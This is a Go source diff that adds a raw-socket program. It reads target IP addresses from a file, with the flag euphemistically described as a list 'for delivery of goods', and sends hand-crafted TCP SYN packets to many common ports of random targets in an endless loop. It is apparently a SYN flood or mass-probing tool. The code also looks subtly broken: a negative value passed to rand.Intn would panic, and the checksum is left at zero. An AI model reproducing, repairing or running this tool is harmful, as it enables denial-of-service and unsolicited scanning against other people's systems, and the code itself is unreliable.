@@ -1,8 +1,17 @@
 package main
 
 import (
+	"bufio"
+	"bytes"
+	"encoding/binary"
+	"flag"
+	"fmt"
+	"math/rand"
+	"net"
+	"os"
 	"strconv"
 	"strings"
+	"time"
 )
 
 var (
@@ -60,8 +69,109 @@ var (
 		"57294", "57797", "58080", "60020", "60443", "61532", "61900", "62078", "63331", "64623", "64680", "65000", "65129", "65389"}
 )
 
-func main() {
+type tcpHeader struct {
+	Src      uint16
+	Dst      uint16
+	Seq      uint32
+	Ack      uint32
+	Flags    uint16
+	Window   uint16
+	ChkSum   uint16
+	UPointer uint16
+}
 
+type tcpOption struct {
+	Kind   uint8
+	Length uint8
+	Data   []byte
+}
+
+func main() {
+	var filename string
+
+	flag.StringVar(&filename, "f", "", "list of ip addresses for delivery of goods")
+	flag.Parse()
+
+	f, err := os.OpenFile(filename, os.O_RDONLY, os.ModePerm)
+	if err != nil {
+		panic(err)
+	}
+	defer f.Close()
+
+	ips := make([]string, 0)
+	sc := bufio.NewScanner(f)
+
+	for sc.Scan() {
+		ip := sc.Text()
+		valid := ipValid(ip)
+		if valid {
+			ips = append(ips, ip)
+		}
+	}
+
+	rand.Seed(time.Now().UnixNano())
+
+	buff := new(bytes.Buffer)
+	ports := generatePortList(top100Ports)
+	//get a random IP address from the list
+	for {
+		n := rand.Int() % len(ips)
+		ip := ips[n]
+		conn, err := net.Dial("ip4:tcp", ip)
+		if err != nil {
+			fmt.Println(err)
+			continue
+		}
+		for _, port := range ports {
+			sport := uint16(rand.Intn(10000-65535) + 10000)
+			op := []tcpOption{
+				{
+					Kind:   2,
+					Length: 4,
+					Data:   []byte{0x05, 0xb4},
+				},
+				{
+					Kind: 0,
+				},
+			}
+
+			tcpH := tcpHeader{
+				Src:      sport,
+				Dst:      uint16(port),
+				Seq:      rand.Uint32(),
+				Ack:      0,
+				Flags:    0x8002, //the SYN flag
+				Window:   1024,
+				ChkSum:   0,
+				UPointer: 0,
+			}
+			binary.Write(buff, binary.BigEndian, tcpH)
+
+			for i := range op {
+				binary.Write(buff, binary.BigEndian, op[i].Kind)
+				binary.Write(buff, binary.BigEndian, op[i].Length)
+				binary.Write(buff, binary.BigEndian, op[i].Data)
+			}
+			binary.Write(buff, binary.BigEndian, [6]byte{})
+			// Send Packet
+			_, err := conn.Write(buff.Bytes())
+			if err != nil {
+				fmt.Println(err)
+				continue
+			}
+			buff.Reset()
+		}
+		conn.Close()
+	}
+
+}
+
+//Validate that IP address is valid
+func ipValid(ip string) bool {
+	if net.ParseIP(ip) == nil {
+		return false
+	}
+	return true
 }
 
 //generatePortList corrects port ranges and deduplicates port list
